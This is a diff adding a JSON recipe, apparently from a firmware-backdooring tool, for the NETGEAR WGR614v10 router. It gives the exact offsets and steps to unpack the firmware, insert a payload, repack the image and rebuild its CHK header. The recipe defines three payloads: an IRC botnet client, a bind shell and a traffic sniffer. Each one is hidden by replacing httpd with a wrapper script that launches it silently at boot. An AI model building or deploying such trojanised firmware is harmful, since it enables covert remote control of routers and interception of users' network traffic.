@@ -1,0 +1,121 @@
+{
+  "Meta":{
+    "Targets":[
+      {
+        "Vendor":"NETGEAR",
+        "Model":"WGR614v10",
+        "Version":"1.0.2.26NA",
+        "Status":"Verified"
+      }
+    ],
+    "Authors":[
+      "Michael Coppola"
+    ],
+    "Date":"April 15, 2012",
+    "Size":2580538,
+    "NeedsRoot":false,
+    "Filename":"WGR614v10-V1.0.2.26_51.0.59NA.chk",
+    "Download":"http://www.downloads.netgear.com/files/WGR614v10-V1.0.2.26_51.0.59NA.chk",
+    "Checksum":"83837b25249f619ba90960a45e009ff3"
+  },
+  "OrderOfOperations":[
+    "ExtractParts",
+    "UnpackFS",
+    "_PAYLOAD_",
+    "BuildFS",
+    "PackImage",
+    "PadImage",
+    "GenerateCHK"
+  ],
+  "ExtractParts":{
+    "Description":"Extracting parts from firmware image",
+    "Steps":[
+      ["extract", "_FIRMWARE_IMG_", 58, 592608, "/headerkernel.bin"],
+      ["extract", "_FIRMWARE_IMG_", 592666, 1986377, "/filesystem.bin"]
+    ]
+  },
+  "UnpackFS":{
+    "Description":"Unpacking filesystem",
+    "Steps":[
+      ["unsquashfs-1.3-lzma", "/filesystem.bin", "/extracted_fs"]
+    ]
+  },
+  "BuildFS":{
+    "Description":"Building filesystem",
+    "Steps":[
+      ["mksquashfs-3.0-lzma", "/extracted_fs", 65536, "le", "/newfs.bin"],
+      ["freewrite", "/newfs.bin", 0, "shsq"]
+    ]
+  },
+  "PackImage":{
+    "Description":"Gluing parts together",
+    "Steps":[
+      ["touch", "_TARGET_IMG_"],
+      ["appendfile", "/headerkernel.bin", "_TARGET_IMG_"],
+      ["appendfile", "/newfs.bin", "_TARGET_IMG_"]
+    ]
+  },
+  "PadImage":{
+    "Description":"Padding image with null bytes",
+    "Steps":[
+      ["pad", "_TARGET_IMG_", 0, 2580480]
+    ]
+  },
+  "GenerateCHK":{
+    "Description":"Generating CHK header",
+    "Steps":[
+      ["packet", "_TARGET_IMG_", "dependencies/compatible_WGR614v10.txt", "dependencies/ambitCfg_NA_WGR614v10.h"]
+    ]
+  },
+  "Payloads":{
+    "botnet":{
+      "Description":"Remotely control device via IRC",
+      "Steps":[
+        ["cp", "payloads/botnet", "/extracted_fs/usr/sbin/botnet"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/botnet _IP_ _PORT_ \\_CHANNEL_ _PREFIX_ &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_IP_":"IPv4 address of IRC server",
+        "_PORT_":"Port of IRC server",
+        "_CHANNEL_":"Channel to join (include #)",
+        "_PREFIX_":"Prefix of bot nick"
+      }
+    },
+    "bind":{
+      "Description":"Bind shell on TCP port",
+      "Steps":[
+        ["cp", "payloads/bind", "/extracted_fs/usr/sbin/bind"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/bind _PORT_ /bin/msh &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_PORT_":"Port to listen on"
+      }
+    },
+    "sniff":{
+      "Description":"Sniff traffic on the network",
+      "Steps":[
+        ["cp", "payloads/sniff", "/extracted_fs/usr/sbin/sniff"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/sniff _TARGET_ _LISTEN_ &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_TARGET_":"Sniff TCP traffic on port",
+        "_LISTEN_":"Port to listen on"
+      }
+    }
+  }
+}
